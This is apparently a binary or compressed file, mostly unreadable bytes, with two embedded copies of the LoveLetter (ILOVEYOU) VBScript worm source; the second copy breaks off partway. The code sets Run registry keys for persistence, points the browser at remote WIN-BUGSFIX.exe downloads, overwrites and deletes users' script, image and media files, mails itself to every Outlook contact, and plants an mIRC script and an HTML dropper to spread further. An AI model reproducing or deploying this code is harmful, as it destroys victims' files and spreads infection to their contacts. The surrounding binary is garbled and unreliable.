\�@��)P���V@D�;;�FA+|�+@v/�B��d���:Q�-D���ЖUm�9�ݳN�(i�9$ң��gWJA�f:DZn1DL�!��$&�s��ܭ�?�w��L����A�5�T�f�<?y'"������"S�y��]�B�S�9j;�m+P'��=��
<�-�S�{�~'Y��pfX�;pᢧ���'�&l���'�#�=d8v�p�����R$q�D�-q���/Bz"����2_�:�,H��u{��f?�����=5�M|z(��}�z��k�%�MF駝z�ze�J�J�J��5ي��N�DO%|��p�}b���M���8��]�{���PX}1aMO�|�����W�Ԅ&/~X���������=�Fދx�?/6��9Ӿ�$��:{�c�Eo-�rF�?�+���������X���&>DۗYh!� H��x�"�\�������� SN�o�tO��Y�Pl-mE*�]ʪ`?f�|��J]u��0c.)��tg�C:���u��`Q�8���޲?0[�xPX�A�e4cO�.�f#���c\�p����~�nQ���f�!x��?L�å5��k�,cE���Ď��D"*�Gt
؞�9��AT9ܛ���ָ�z&*�ƔH~�:��+�$���I��9���G �MI9���<z�Ľ�)�s,?��,U���4��*,E#���L����r��W��.���Ql��[�e�F8���&�sˇϡL��:��U�L]I38���A�H�Q_f%-�'Uz�7=�Cm�u2��R����f���)��w�A�7�<A+ҹ�a��W(vd�����FY�an��tr~y{�ԅ��pZv��CsVq9�s�F���K�/&���Ò��D0��2��% ;~��O�W.J���I$4�{���ɫU�c�Y�P�3��Xv��N�����lyn��!�0��F����?O#")*'��֘��Vq�Jݧӄ�5��ɬ�
��L���|���R+�}.y��˲�͠����|��e��'�o����m��8�������1�rpL�mn���C���ܦ ���B�V���@�mo��ƏI�E�o�.8�������M{?�<����l��-�M�A,ޅ�N�	4#�s ��`�.A��C�|��SC���b�HI�|��,BMn��i6FeZ#ن�2� �~Ï�ё��×N�����,󃀠bO��D�EDմ1�Ӊ��>�I
�iM9SiI2�@�����⾷��
�������rd��A�)k��MP[����lL4�����Ύ~$��)��� wR1��m�$�#�^$�Us5�KG����9Q��t�����
���k�|�V�z��n�Ǫ�gG�lD=�vDqQ��x�mL�'��	�LK�Μ ��E�� �Kg��Qߗ�S:<E�Zg��R��\b��J.��4
�J������˸�Ѷ��-�[Qf�@�*b���s�=Z��d,6�z�^��>�wAe� [�ͻ],&�$3���N���P~����8Wm�&��/�@;�Y���!��,�������*Qٕ�D�AP��0���\b�[����I�|E��Xn�]00d���rI.Ϲ���w7�:�5��v�t��������	��l�M#�7�|,�^�x�=#��}������S(u���1R��f�{I�K@�U58 �:��ɕUOB���2Փuj���'g��D$�7��#1��H�wL}�c��q-�+rݓk�����DXɨ� ";��'_������ο��O#1���3/Rg�5��bi��O����Gh��il�kI��ؚ�}�(.�m�.elk���B'Yi��=�������SpG�P"��i�O�i�b�\��k� \'�)���������F�L���ھ�{\���B����k�Dz@<���[�D�m*������}�|��i��~�y`@�a`m�g:�����)�x���8FA����Hm�j� Y�24��k=<�3���$��<��:#�j���6F!h�z`i6B�j�����G�V�Q�io��1���Ƞ��<��h>��S�N����[3~�V	5��}�Q��vE�&��3�-u��?�B������ɿo5g��#^�����^ǥo�gP<�,����d=�CeG�7���zΓu��'WrY�@O��QW:�����j��)5@�`��8����= a���>�e=����5���p]�W_�A,K�y�=��i��_��fQ�Y\�����/��I,ΐW&�Ҽ.@��Vb>�L��,�L�G�'6��ܘ]Do׿1����@�2J�^�R0N���#��c�sѠsӋr4q,X[�� ������� "��B�	v���O{�tmr��)S4Oz��F!���g�=[Z��S����$�dW��"=�}���s{3t札ʢ��I<�'�ݻ�ʮ�x�������Iq����3�m���A!�� ����[�e��T�	uHi�h|��x��A,|TP��K��U�J����ɤk=`�1����[7�����;Gr��VA���W�HP�C'��DT N ����b谛W��n�a�/(4S��h��ݪ<�;��ew^(-۰$;S���hnfP�n�{�C9:��oNa/�ӿ��T@� {;
A�E�0��m�%�H	U[C:>7GHG�S"qn h�d'��-Ď���Mc��nzD>i�@9(�F�b���N;k���0{�K�x�����J�0� �i���}z{�sdB��a�<|�\l�e��<t_��|���q2_v��6�1�>����,�h��ղ6��Ü}�׋�Qm"kz���4�� Lt�*L��3��m8�#%4HÛۜUEJ=�ć�_�XP]`�u��F]��b�.6h����h�_�ڧ��wA�L�ec]�;g�Vʖٮ�,�̇V���=�O.,H�R���V_(�s�dcV����Q�#�?����ۧ�����ێ�Q�A/�����g���Mvߥ�	5H�z����٧D\��~�T]s� �UW�+�{Ө���������D/����7��(w&��.���.4�@��Fz�#��Ơְ�؀&W;�"8�# ��JJ4r��Ir�b��J)gg6�
��%W���)Ү�z��.R�З���L��IYa�y ���ܡ'>HF�sV�"SH1�����6'~��J(Y#ER=�ఴB�2��F|�����!��ܵЇT"�������vvGn�b]�,%�Ȍ�餒��J�]$3��sOq���񒰰��!nf�݋�j��04��X��e��cb��qpr;���J�;8OQ3Ǡ���.p�I��chξ�5ϴ�D�V1�M잼=�bpn��т9�5��,��0�vIW���WL�Q\,bu,x~�g�K�cV��2��'!UҸq�+d}t�\dm�=ԩY��_-}J�o���!�|�%�ߘj��֑贼�M��{�����j��I����۵��(ɋ���)�D�N��`��INp
2�W�A
B,��\H;��[!=+��.��I��OK���Ä<�z�_�s0���o1sӭ6h�^�"Y,$w��ɴ�זy��3t*�A�-m^P4O���:�vЖ�j��d+�PoG9�ma5�פޫ��Wf�xɯ��V�ie�Jם��A�kY��e�_��qWg�#A�g%������YHi�l/��"��P^�6Pn�m��D��Z�j*�� �F|�"0�-���-�@1[˵$��L:�b2�%몇�p�!����N(�s�@�v�g�in��
��Fғ�ϝ3�k��K�O��%��H,�f�P)�����=8�E7%�ߔ!�i�/<�.	
��/��[Σ�3J?
������e���u�7���$�b�a`1��E�v�ml��n�.H8�?�2��N	��%���v�>q���s�yxN�"{9�ەoUƶ��LV�c�
� MD!�n�zp��'��x���jF�A3%F�~>&ڞ���y��/qV*��!�vL&m�Ǎ��h�k���������4��U���{F[���a�/�����]�:YP�A�%5��e��P�m��~�n!��z�S ��l_&��pjYG��X$�N�$Fn T:Q9�xN?��W,���?^mm^�Z;\_;�<_j'���{���X&@�W���z+$Q��h�=��O���D�5�r ��B^���[���J�
�P�Q(.EsZ�U}|Pg3�B�P�����T)7�R*�?p���Aa�����}u��&�����@5l> �\�xk��F�b�Ĉ�=�[��Y:^<W�Vd��<Xޑ��Tٰ��"HTn�J����lG�VK�;@�}�C}��L����.��n_�h��ɱw�Af8�'ˉ�z��à<��z9�D��|����(��0�9����O?�ݏ{�'d��+�G-Lj^9��4��n3�����l9]�bH�㩀�at�b���V�p0�dZ��Ĳb(�P�y\�Y��o�8��W%� �\�E��}C)xk	��h*��2Z��f[�l�H�2/JH� �a$^�g )8�����Z�40S���O|\��u��b���ʧĂ���-�gA��a~.�a= ��y7��o.�|E����6��$W�w	�Z-�L?�9�3 chh���rem  barok -loveletter(vbe) <i hate go to school>
rem 			by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Group  /  Manila,Philippines
On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
eq=""
ctr=0
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
sub main()
On Error Resume Next
dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
if (rr>=1) then
wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
end if
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy(dirsystem&"\MSKernel32.vbs")
c.Copy(dirwin&"\Win32DLL.vbs")
c.Copy(dirsystem&"\Very Funny.vbs")
regruns()
html()
spreadtoemail()
listadriv()
end sub
sub regruns()
On Error Resume Next
Dim num,downread
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32",dirsystem&"\MSKernel32.vbs"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL",dirwin&"\Win32DLL.vbs"
downread=""
downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
if (downread="") then
downread="c:\"
end if
if (fileexist(dirsystem&"\WinFAT32.exe")=1) then
Randomize
num = Int((4 * Rnd) + 1)
if num = 1 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
elseif num = 2 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"
elseif num = 3 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe"
elseif num = 4 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-BUGSFIX.exe"
end if
end if
if (fileexist(downread&"\WIN-BUGSFIX.exe")=0) then
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX",downread&"\WIN-BUGSFIX.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"
end if
end sub
sub listadriv
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives
For Each d in dc
If d.DriveType = 2 or d.DriveType=3 Then
folderlist(d.path&"\")
end if
Next
listadriv = s
end sub
sub infectfiles(folderspec)  
On Error Resume Next
dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
set f = fso.GetFolder(folderspec)
set fc = f.Files
for each f1 in fc
ext=fso.GetExtensionName(f1.path)
ext=lcase(ext)
s=lcase(f1.name)
if (ext="vbs") or (ext="vbe") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
elseif(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct") or (ext="hta") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
bname=fso.GetBaseName(f1.path)
set cop=fso.GetFile(f1.path)
cop.copy(folderspec&"\"&bname&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="jpg") or (ext="jpeg") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
set cop=fso.GetFile(f1.path)
cop.copy(f1.path&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="mp3") or (ext="mp2") then
set mp3=fso.CreateTextFile(f1.path&".vbs")
mp3.write vbscopy
mp3.close
set att=fso.GetFile(f1.path)
att.attributes=att.attributes+2
end if
if (eq<>folderspec) then
if (s="mirc32.exe") or (s="mlink32.exe") or (s="mirc.ini") or (s="script.ini") or (s="mirc.hlp") then
set scriptini=fso.CreateTextFile(folderspec&"\script.ini")
scriptini.WriteLine "[script]"
scriptini.WriteLine ";mIRC Script"
scriptini.WriteLine ";  Please dont edit this script... mIRC will corrupt, if mIRC will"
scriptini.WriteLine "     corrupt... WINDOWS will affect and will not run correctly. thanks"
scriptini.WriteLine ";"
scriptini.WriteLine ";Khaled Mardam-Bey"
scriptini.WriteLine ";http://www.mirc.com"
scriptini.WriteLine ";"
scriptini.WriteLine "n0=on 1:JOIN:#:{"
scriptini.WriteLine "n1=  /if ( $nick == $me ) { halt }"
scriptini.WriteLine "n2=  /.dcc send $nick "&dirsystem&"\Very Funny.HTM"
scriptini.WriteLine "n3=}"
scriptini.close
eq=folderspec
end if
end if
next  
end sub
sub folderlist(folderspec)  
On Error Resume Next
dim f,f1,sf
set f = fso.GetFolder(folderspec)  
set sf = f.SubFolders
for each f1 in sf
infectfiles(f1.path)
folderlist(f1.path)
next  
end sub
sub regcreate(regkey,regvalue)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub
function regget(value)
Set regedit = CreateObject("WScript.Shell")
regget=regedit.RegRead(value)
end function
function fileexist(filespec)
On Error Resume Next
dim msg
if (fso.FileExists(filespec)) Then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
function folderexist(folderspec)
On Error Resume Next
dim msg
if (fso.GetFolderExists(folderspec)) then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
sub spreadtoemail()
On Error Resume Next
dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")
for ctrlists=1 to mapi.AddressLists.Count
set a=mapi.AddressLists(ctrlists)
x=1
regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
if (regv="") then
regv=1
end if
if (int(a.AddressEntries.Count)>int(regv)) then
for ctrentries=1 to a.AddressEntries.Count
malead=a.AddressEntries(x)
regad=""
regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead)
if (regad="") then
set male=out.CreateItem(0)
male.Recipients.Add(malead)
male.Subject = "fwd: Joke"
male.Body = vbcrlf&""
male.Attachments.Add(dirsystem&"\Very Funny.vbs")
male.Send
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead,1,"REG_DWORD"
end if
x=x+1
next
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
else
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next
Set out=Nothing
Set mapi=Nothing
end sub
sub html
On Error Resume Next
dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
dta1="<HTML><HEAD><TITLE>LOVELETTER - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - LOVELETTER@-@>"&vbcrlf& _
"<META NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-? @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>"&vbcrlf& _
"<META NAME=@-@Description@-@ CONTENT=@-@simple but i think this is good...@-@>"&vbcrlf& _
"<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ "&vbcrlf& _
"ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"&vbcrlf& _
"<CENTER><p>This HTML file need ActiveX Control<?-?p><p>To Enable to read this HTML file<BR>- Please press #-#YES#-# button to Enable ActiveX<?-?p>"&vbcrlf& _
"<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>----------z--------------------z----------<?-?MARQUEE> "&vbcrlf& _
"<?-?BODY><?-?HTML>"&vbcrlf& _
"<SCRIPT language=@-@JScript@-@>"&vbcrlf& _
"<!--?-??-?"&vbcrlf& _
"if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"&vbcrlf& _
"<SCRIPT LANGUAGE=@-@VBScript@-@>"&vbcrlf& _
"<!--"&vbcrlf& _
"on error resume next"&vbcrlf& _
"dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf& _
"aw=1"&vbcrlf& _
"code="
dta2="set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"&vbcrlf& _
"set dirsystem=fso.GetSpecialFolder(1)"&vbcrlf& _
"code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"&vbcrlf& _
"code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"&vbcrlf& _
"code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"&vbcrlf& _
"set wri=fso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)"&vbcrlf& _
"wri.write code4"&vbcrlf& _
"wri.close"&vbcrlf& _
"if (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) then"&vbcrlf& _
"if (err.number=424) then"&vbcrlf& _
"aw=0"&vbcrlf& _
"end if"&vbcrlf& _
"if (aw=1) then"&vbcrlf& _
"document.write @-@ERROR: can#-#t initialize ActiveX@-@"&vbcrlf& _
"window.close"&vbcrlf& _
"end if"&vbcrlf& _
"end if"&vbcrlf& _
"Set regedit = CreateObject(@-@WScript.Shell@-@)"&vbcrlf& _
"regedit.RegWrite @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^MSKernel32@-@,dirsystem&@-@^-^MSKernel32.vbs@-@"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"
dt1=replace(dta1,chr(35)&chr(45)&chr(35),"'")
dt1=replace(dt1,chr(64)&chr(45)&chr(64),"""")
dt4=replace(dt1,chr(63)&chr(45)&chr(63),"/")
dt5=replace(dt4,chr(94)&chr(45)&chr(94),"\")
dt2=replace(dta2,chr(35)&chr(45)&chr(35),"'")
dt2=replace(dt2,chr(64)&chr(45)&chr(64),"""")
dt3=replace(dt2,chr(63)&chr(45)&chr(63),"/")
dt6=replace(dt3,chr(94)&chr(45)&chr(94),"\")
set fso=CreateObject("Scripting.FileSystemObject")
set c=fso.OpenTextFile(WScript.ScriptFullName,1)
lines=Split(c.ReadAll,vbcrlf)
l1=ubound(lines)
for n=0 to ubound(lines)
lines(n)=replace(lines(n),"'",chr(91)+chr(45)+chr(91))
lines(n)=replace(lines(n),"""",chr(93)+chr(45)+chr(93))
lines(n)=replace(lines(n),"\",chr(37)+chr(45)+chr(37))
if (l1=n) then
lines(n)=chr(34)+lines(n)+chr(34)
else
lines(n)=chr(34)+lines(n)+chr(34)&"&vbcrlf& _"
end if
next
set b=fso.CreateTextFile(dirsystem+"\Very Funny.HTM")
b.close
set d=fso.OpenTextFile(dirsystem+"\Very Funny.HTM",2)
d.write dt5
d.write join(lines,vbcrlf)
d.write vbcrlf
d.write dt6
d.close
end sub                                     �R�!��ZRk<�0H��.ilH/O�Fj�,�5�$�����Jr��݋��9EN�*�QN�Z��g�+l�MlE�;^͝m@yP���}h��4.#ٻE�Y�����������f�{��Y����ء�ݨ�88[ՂK��͸�7)�=qwh$�i ��]�uS����A�����n���k[H]*q9��cgt���0�:�J�o��*���b�,�2��#^�����^wM��?���-�O7%�gW�M��^����"v��9���wp{��@<��Ua�b�=��8$U]?�7�Oi�X5[�M�� q�1��R�]Qא�r5��	��~���j�;���q�w���<��<������pi�sH{m��٠sqΗ�nkz��k��;�����g�0�N�Ki��c�yw���_��9�WT�:�f�*�@XG�䗆����:6C���r���MwzM�_����'4���3�&��6��/��axc���ؕ{�a���T�O��ʚ]���	��Q�8t݇m�?'��SZ�Nz*�_+V��j5>�����5c�j
-��Za����Շ�k��c$hku��g��'��^`�w~�ܓW]�@=>��!;���SN���,,j�M�[�j�(���_�f��D!*�\����1A��	���H��!v���XSvq��29lܟ�������N��ڍ�u��
ϔԏ��]��p7���E53��Җ�̐^E~��wL��&���i��+#o]4@����'f�5��C6�ҽ��jk	�qMP��}�n�����@c��k�#7��1�"��_�t������m½������^����Ğ}:���0�E 4��zi��Ӝ��g��l��r<�"YB�\?��}�ȽU�k�Hؓ~D��;37�8��D��rθQ�؄=�u�39@�i�#�Eu����*ӻ�@T��C(Y��	N�1� �A\6�������tǨd����m 8yS��z�N��m�j^ۼ�=��X���!UY߉�6{�N��o���1!��b�:?�}�sϫG��H�c'e��vv#��g�Ӿ���$<Vn�|3���fF�	��\ޭ�F���-�l�~�Ý�[!(���DxMV>�4��M|'�G�$_;���8 ��z�5!�M���	���)�OX���B��C%O&���s�z��_L5:�;v.�O7�v�v4��Ԝ[�>=�$��?�]�R�&�����T�j���JH�3,��'���w�����ű�{y��;D�X�L��YK�@ʠ�w�="]����Z�ӝ�h�<�Yc�2��4$�V����k=��#Ӕ�/��f)�jW��xQ���9�I�x�*ul�p;+�bi�nVd��e:��26S�_ej��&��B��u35#h�f����S[�t�J��L�4v�t���\�Ɵ���d�ϝVX�)�ӥ�5���zW.$c�i����b����bɗ��G��z���Aڝ.n�V֊��g��'<�x�Tn�Z����Q&����D�3����ݗG�"�|�@���ש����~H5g��oO���^���z�V,�)�D?A��!0�v���#���Z�5�{	��9���L�[�U����MM����	}�v����)�VpZ�</ހ�@��.�K10�r�ng�4���0��*��m�u���B~����i>��!������ϗ��~��}��;[?@��A�?x1FOR̬��T��Tf����3���HBN'�BR_9�]T�}S�X���T|7gy��)U���=��U�|��]��f����j� ��+���Ta��/�,�b5�9f�>������$�c�LHz�bN��u�����Z��]��^�ZZvv�Z�u�\){k�ӡ�מ��]�5�u߄]v���m����_� 2G?'�ҟ-m���F�H����.^^�G:�]��#�1�� �6ӻ��l�C�f����U\-l=�ӟ�_���p��Z�u2l��GOo��1��I%��<M���˨^\��E�K��藖��"��a��Հ9�0�1}�Q�U��T����㝈.Y�Y	�?f]:}����X�򍮉{WqG�JOƖBj�)�q:�o�KL�#��%-��j��x{>����6w��e�1Z�qF3�y5�|F�M��F3��&:����]�nm��f�1�`��j��T�x�ȮA�=%�[�	T��{�)�Bͻ��r�z��IL����qs�/�/��<{B�%^��DS�F��r��q[ݛ�O���eL�(Ͳ��[?W
^��g��?*,�_6b��Nl��&��wqm�y�9x#Xs�@+m4�˞���\$ �م�+��'p�r�m�:�@��X+%�#fb�u�t����)Ikɷa/�{[���N�_87Sz�1�����9�}�'��r%:�� �=�\a��;a���J���_�&��D{�x�pt��4�=��R��b�as|��e��������x����V{�\���l���i�,��9��1��o{<v� kd��7tLujW�Sǯ�9b�Sj�k)����P�̪�7��?	���ǥ`r�=��͟3��o�	8��}kb����L�}�q��!�'�N.�9�����]��G�l�v-�?Lh�/~���W[���.��%+V�w��yT~�c��M<_�ͧ��'O��!��~��!cD��ҹ�/��l��a���vܙ?���~flc�cN��n4�s�5�����¹�^��Z������l}G-���;�4D����\�A�Ķ��u~�-}��E~#��J6Smc��m���BlQ�F��D�Ԇ����Df�GQ�F��Z;Gj��>�/�4\9���c��՟^���p
G�Rzp��,`���ޙ�\�q�2�=yMs�����[�@��ͪv,��#ͯ9��1�#t�u;�9�������@���g�uh�
=���4$͌?bnv��;�8�������26�koٻo��cY��A&|��8�w�gC�=g�t�OS�⡍���9@��һ ��7�h�lnc���#�ޱ�3p��t^�������%��ة�&���"6�>�����f�|��$�#��r�j��
G���ޛf��ʂ���'5�D:�@V~�Uv�WM�mx��\�����s�x���a��a}���>����.���P�v�п��T����E�sG���֪�1�o�Xvp�Ȱ����Y�F#�3ٔ��q;�� ��Y�`�뎊�X)�������}�xR*�����6&H�S��\��?N fDЙ�� ��d�Ӧ��M͖ϧo��=tZ!�t�5��vY��5�B�ć򹾁ξT3F��,{�I#5
�i[ݑ���_�̼лH�m&��'Z)��\�ut6�n��
��K�ɣ@\-���)�H �
�� @K
(L* 
l+�F8Q��� #:A���hD�nn���8��x?�y*�`$f�{g�ܯ�O{{^�ߚ�ֆ���g��h�r�	��QL��w����UUK�YN���G��|�l訒S�8o���^}'���-��u�:�8k�(.<皸������)m�w�q�汭m��#�q�`6����`�pɇ���Q?L�Е'y �>}���[yؽ�����b��� "#�b&Ka�|�W�2���<��GU�bl.#,sa߿=����:�k����or�ʗ���B�g�o����#��p{>���}��.����w��OǾ�Xw?��E��9["�s�õq�f�hhr�+^bRz�{��yFYD�7�(����t��J�+=X6�~;M��,v~O�]"HE�(2�m��D���*zd��fY�NFjf9��"D�,��^���"���oT��H:�ۉ0n������FO���p�l��h�+�i|��/ą���K��̩�>:Mw}j���
}=/e��T_gz�,Ns�w��I�H5{>���R݆�fRO'�i:�����!u��7�6��E �P �:�bʻ��6"b��]z!K���L�v�I_b#G��&�n��~LX��M�\Jd���w	���"HM�m�
��
����K졓��!�T������+Ҋ�L��hZ9����P{M҆fҷ1T��K����^�U�E)�5�D�ִ�N=�����C�Qڼ}�V��y�,Riժ��f���/SGT++�Ҽ?�=�I�u��躈���x&E%���G�So�{�ÝI�B�f:*�%�&)�lq�J"&��!�9|�6�f,�E�����q7Vg�^M���Lc�S`!;� K�N>��K �"(%K��<PO'�O
\%S�X��RT�Oa'���IZ�s�}��s�Q��RT6�E?'#iP�����U{�\�>T}�*�ŸoC~�w���}��g�Ԭ(�M��1Gy�b#;Z���<a�{J�����v�	��t��¢:P���%eش�}w�M>�0V:�	��+O�RB,�P�B�aV,%Ǆy�<FJbp�xKK	�%�w��s�� ��ާ*9��"BH�U�j�XU-Q{x�E)X�]z�O�"ϖub��ʥ$L�C1xKI�඀�)	}��S�%��/�a�J��p"v��$��c'�-B�qJv�B�	!
h)e'�%�4e[H<��b��7f;�l9(��pJb�$�8A;mP��=�R�dU.de]P��L�R�Q�X =d��M���SYqG��|Ҙ)����,�V��H���1���`Db^�d��d��/�鑴݆��y�6[�4QjP"����/WW�g�N��]�iڨ�Ҟ)�,͡���j��,.¡��[Ht`ReV�t�-�^�Q�m���<
�+϶D��x%ݵ�o�I�r/-U�+�M�L�%�(��)��`�E�E�
�s�Wb����Z޿�$��R���35��S�̱l�b�c�q>Zp���M;۔{�����u��UW���}\���z j^*8�dT,��B��x/0*���{�Riucܦ�2��Ƥ=�	R��6����&/�*|��r��%D
�^��R�4EdT߿+}�{�2�#f
~=��+ˍ����=�\�@$�/������\s�2����f���N.���&p��B �1)|E��
��2niM�)GN]0xQ" i��/�%]���2,����e%�}4S�@|�;�w�)V��02x	��+>�Y�yXe)���J��*���V�X�W�� ����-�=&=o�r�*+��A�&J��L|
J����I�����\�����\��H�(����e�x�ȫRA��W��ȫڔE��W2�����*�)�7�hH�є�Q0Y�|(���~�����d�#�����[��H^��J���R�U��B*��R�U�|�WJr���fh"&_�P�\���r�"_�=��,��K�Q�KevQ�P)��r��������	w�Zbn�ӫJj��We���Q;��,gN�.�`�z/p�	wlr=��y���k��ha%���K_� ��`[�G�l[�6�͜3����~�?'�Ho��n΄�rm�����/���FOSeTs~���l��ruS�Lgk(��ֲ.�+3@6��g3������������M&:��$���v3	;~���D��(��o����S��`X���@��%������ow�и8���lZ�Io�?�ߟ%h�Vo�5�zI�s���m�VQ�	 ��2;ā�
@EA p6�
�����.\P���<�Cp0�A�|�cT���a��O(U�pD�c �F��x�w����AczJ�X�1']�)I2��L!��sW/�,x̟ZQ�ɉ&�v�&���>�6�8�i�m�փ
?��)?{�L.B����������:~Ϫ��~K�MA��������-���l���l?��~����@�r]�+_^�q��-�T.���k������L�w����$�2W���!}`|���S�O�(���0��X��W�}Ǒ��M�:� ��C����_=���e�T�7��06t1��l��.��� ��������o��NOp�jE�h(�:�����{G8I��m@��K� �=�ǝ�5h�Qi��?-�T)�ۣ��жO��j�!�~o�H�uB�Ԟ�����ߧϫQ鴭61����6�C�YhZ�4�TN���A5nSl�I��U�aK5F,m_U��rem  barok -loveletter(vbe) <i hate go to school>
rem 			by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Group  /  Manila,Philippines
On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
eq=""
ctr=0
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
sub main()
On Error Resume Next
dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
if (rr>=1) then
wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
end if
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy(dirsystem&"\MSKernel32.vbs")
c.Copy(dirwin&"\Win32DLL.vbs")
c.Copy(dirsystem&"\Very Funny.vbs")
regruns()
html()
spreadtoemail()
listadriv()
end sub
sub regruns()
On Error Resume Next
Dim num,downread
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32",dirsystem&"\MSKernel32.vbs"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL",dirwin&"\Win32DLL.vbs"
downread=""
downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
if (downread="") then
downread="c:\"
end if
if (fileexist(dirsystem&"\WinFAT32.exe")=1) then
Randomize
num = Int((4 * Rnd) + 1)
if num = 1 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
elseif num = 2 then
